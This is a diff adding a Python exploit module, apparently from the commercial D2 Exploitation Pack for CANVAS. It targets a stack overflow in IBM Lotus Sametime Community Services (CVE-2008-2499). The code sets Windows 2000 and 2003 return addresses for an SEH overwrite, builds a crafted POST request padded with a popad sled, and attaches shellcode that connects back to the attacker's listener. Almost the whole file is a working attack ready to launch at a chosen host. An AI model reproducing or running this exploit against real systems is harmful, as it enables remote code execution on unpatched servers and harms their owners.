@@ -1,0 +1,159 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+
+import sys
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import struct
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import shellcodeGenerator
+from encoder import alphanumeric
+
+# GUI info
+NAME = "IBM Lotus Sametime Community Services Multiplexer Stack Overflow Vulnerability"
+
+DESCRIPTION = "Stack Overflow Vulnerability in IBM Lotus Sametime Community Services Multiplexer"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = "IBM"
+DOCUMENTATION["Repeatability"] = "One time"
+DOCUMENTATION["Date public"] = "2008.05.21"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-08-028"
+DOCUMENTATION["Versions Affected"] = "IBM Lotus Sametime 7.5.1"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2008-2499"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2499"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "1.0"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : [ "Windows 2000 SP4", 0x7c3530c0 ], # pop,pop,ret    
+    1 : [ "Windows 2003 SP2", 0x7c3530c0 ], # pop,pop,ret    
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.port = 1533
+        self.badstring = "\x00" 
+        self.ssl = 0
+        self.version = 0
+        return
+
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]    
+
+
+    def createShellcode(self):
+        return self.createSmallWin32Shellcode(self.callback.ip, self.callback.port, subesp = 1000)              
+
+
+    def run(self):
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.ssl = int(self.argsDict.get('ssl', self.ssl))
+        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        s = self.gettcpsock()
+        s.connect((self.host, self.port))
+                
+        self.websend(s, sploitstring)
+
+        ret = self.ISucceeded()
+        
+        if not ret:
+        	self.log("Sleeping for two seconds to check for callback")
+        	time.sleep(2)
+        	ret = self.ISucceeded()        
+
+        if ret:
+        	self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+        	self.log("%s done (succeeded!)" % self.name)            
+        
+        return ret
+        
+        
+    def makesploit(self):							
+    	os_name, seh = targets[self.version]
+    	ret = struct.pack('<L', seh)
+    	
+    	jmp = "\x74\x23\x75\x21"  
+    	
+    	# Windows 2000
+    	if (self.version == 0):  	
+    		popad = "\x5b"*5 + "\x61"*268 + "\xff\x24\x24"
+    	
+    	# Windows 2003
+    	elif (self.version == 1): 
+    		popad = "\x5b"*5 + "\x61"*269 + "\xff\x24\x24"
+
+    	data = "\x66"*44 + jmp + ret + "\x66"*29 + popad
+
+    	buff =  "POST /CommunityCBR/CC.39." + data + "/ HTTP/1.0\r\n"
+    	buff += "User-Agent: Sametime Community Agent\r\n"
+    	buff += "Host: " + self.host + "\r\n"
+    	buff += "Content-Length: " + str(len(self.shellcode)) + "\r\n"
+    	buff += "Connection: Close\r\n"
+    	buff += "Cache-Control: no-cache\r\n"
+    	buff += "\r\n"
+    	buff += self.shellcode
+    	    	    	    	    	
+    	sploitstring = buff
+	
+    	return sploitstring
+      
+        		
+    def displayVersions(self):
+    	i = 0
+    	print 'Available versions:'
+    	for listline in targets.values():
+    		print "\t%d: %s" % (i,listline[0])
+    		i += 1
+
+
+    def usage(self):
+    	print "Usage: %s -v version -t targethost -p port -l localip -d localport [-O ssl:0|1]\n" % (sys.argv[0])
+    	self.displayVersions()
+    	sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
